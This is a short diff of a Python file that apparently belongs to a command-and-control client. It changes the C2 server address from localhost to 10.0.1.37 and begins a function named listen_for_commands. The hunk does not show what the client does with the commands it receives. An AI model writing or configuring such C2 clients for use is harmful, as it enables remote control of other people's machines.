@@ -2,7 +2,7 @@ import socket
 import os
 
 # Client setup
-SERVER_HOST = '127.0.0.1'  # Replace with the C2 server's IP
+SERVER_HOST = '10.0.1.37'  # Replace with the C2 server's IP
 SERVER_PORT = 9999        # Port where the server is running
 
 def listen_for_commands():
